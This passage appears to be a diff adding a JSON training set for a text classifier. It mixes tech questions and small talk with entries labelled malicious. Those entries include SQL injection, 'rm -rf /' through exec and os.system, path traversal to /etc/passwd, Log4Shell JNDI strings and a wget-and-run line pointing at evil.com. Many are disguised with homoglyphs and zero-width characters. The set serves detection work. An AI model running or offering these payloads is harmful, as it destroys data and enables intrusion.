@@ -1,0 +1,2184 @@
+{
+  "train": [
+    {
+      "text": "How should I implement MongoDB?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "exeс('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I understand now.",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What payment methods do you accept? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are best practices for Docker?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I'm satisfied with the results. Thanks!",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are the benefits of REST?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "UNION  SеLECT  null,  null,  null  FROM  informаtion_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the best practices when working with SSL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Hello, how are you? Thanks!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Thanks for your help!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What is the purpose of environment variables?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How do I use Authentication?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtimе.getRuntime().exec('rm​\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I'm learning about Docker",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "../../../etc/passwd",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "${jndi:ldap://еvil.com/a}",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I need help understanding AWS",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are the benefits of Kubernetes?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "what is your refund policy? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Explain JWT for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Do you offer discounts? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "java.lang.Runtimе.getRuntime().exec('rm​  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How do I use Python?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain SQL for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What are the best practices when working with OAuth?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are best practices for OAuth?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How does JWT work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How should I implement Kubernetes?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are best practices for React?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How do I create a new branch in git?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Show me best practices for React",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How should I implement REST?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "../../../etc/passwd​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are best practices for Encryption?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "eval('alert(1)')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Show me best practices for Security",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "UNION\\x20\\x20SELECT\\x20\\x20null,\\x20\\x20null,\\x20\\x20null\\x20\\x20FROM\\x20\\x20information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain the concept of dependency injection",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "exec('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I want to understand Docker better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Show me best practices for Database",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How do I sort an array in Java?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain Kubernetes for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What should I know about PostgreSQL?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "rm\\x20\\x20-rf\\x20\\x20/",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "i understand now. Thanks!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Can you explain Kubernetes to me?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "the service works well. Thanks!",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are the benefits of CI/CD?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "import os; os.system('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Tell me about REST API best practices",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "DROP  TABLе  users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the recommended way to use SSL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "<script>аlert('xss')</script>",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "UNION\\x20SELECT\\x20null,\\x20null,\\x20null\\x20FROM\\x20information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you teach me about REST?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "${jndi:ldаp://evil.com/a}",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How does OAuth work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Where is your office? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are the best practices when working with PostgreSQL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Show me best practices for SQL",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "eval('malicious\\x20\\x20\\x20\\x20code')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain CI/CD for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are best practices for JWT?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "where is your office?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "UNION  SеLECT  null,  null,  null  FROM  information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "SELECT​ * FROM users WHERE id=1 OR ​1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How long is the trial period?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "DROP  TаBLE  users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain Python for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What should I know about MongoDB?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How does AWS work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I need help understanding MongoDB",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "​隐藏​字符",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "have a great day! Thanks!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What is the recommended way to use Docker?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the difference between HTTP and HTTPS?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How do I use Docker?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the difference between Git and GraphQL?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I'm learning about Encryption",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "exec('rm​ -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the benefits of AWS?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Show me best practices for OAuth",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Explain Encryption",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​\\x20\\x20-rf\\x20\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I'm learning about OAuth",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "DROP\\x20\\x20TABLE\\x20\\x20users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "this is exactly what i needed. Thanks!",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "eval('alert(1)')​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Show me best practices for GraphQL",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "thanks for your help! Thanks!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What is the difference between API and Authorization?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Can you explain Authentication to me?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "DROP TаBLE users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "../../../etc/pаsswd",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you teach me about Authorization?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What are best practices for MongoDB?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How should I implement CI/CD?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How should I implement Docker?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && /tmp/x",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain Cloud for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What are best practices for HTTPS?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How does Cloud work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "${jndi:ldap://evil.com/a}",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How does HTTPS work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are best practices for Authorization?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "DROP​ TABLE users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Show me best practices for API",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Show me how to write a for loop in JavaScript",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain SQL",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I want to understand Git better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How should I implement API?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What is the recommended way to use OAuth?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are the best practices when working with CI/CD?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "That's interesting. Thanks!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What should I know about Cloud?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Can you explain JavaScript to me?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What is the recommended way to use JWT?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How does Git work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "exec('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are best practices for Cloud?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I'm learning about Authentication",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "That's interesting.",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are your business hours? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "have a great day!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are best practices for AWS?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What should I know about Kubernetes?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How do I use MongoDB?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  informаtion_schemа.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are best practices for SQL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "exec('rm\\x20\\x20-rf\\x20\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "impоrt os; os.system('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain the difference between list and tuple in Python",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "DROP TABLE users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "*)(uid=*))(|(uid=*",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "The service works well.",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Can I get a demo? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "How does Security work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are the best practices when working with Authentication?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I'm learning about SQL",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "../../../еtc/passwd",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What should I know about Authentication?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "import  os;  os.system('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain JavaScript",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "what payment methods do you accept?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "How does MongoDB work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you teach me about Kubernetes?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "еxec('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Show me best practices for JavaScript",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "eval('malicious        code')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the recommended way to use API?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Explain MongoDB",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain GraphQL",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Can you teach me about SSL?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Explain CI/CD",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are the benefits of Authentication?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "the interface is user-friendly. Thanks!",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "rm  -rf  /",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How long is the trial period? Thanks!",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What should I know about Docker?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How does Kubernetes work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are the best practices when working with AWS?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I want to understand REST better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "DROP TABLе users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is Encryption?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Do you offer discounts?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "SELECT​ * FROM users WHERE id=1 OR 1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How should I implement SSL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What should I know about API?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "good to know!",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "rm​ -rf ​/",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "DROP\\x20TABLE\\x20users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What should I know about Python?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How should I implement AWS?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I need help understanding JavaScript",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I need help understanding REST",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are best practices for Git?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "*)(uid=*))(|(uid=*‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Show me best practices for DevOps",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What is the difference between synchronous and asynchronous code?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain Docker for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What is the difference between Database and React?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "exeс('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "DROP  TABLE  users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "The interface is user-friendly.",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "I'm satisfied with the results.",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Can you teach me about React?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "I'm learning about JWT",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "what are your business hours?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are best practices for Authentication?",
+      "label": 1,
+      "category": "best_practice",
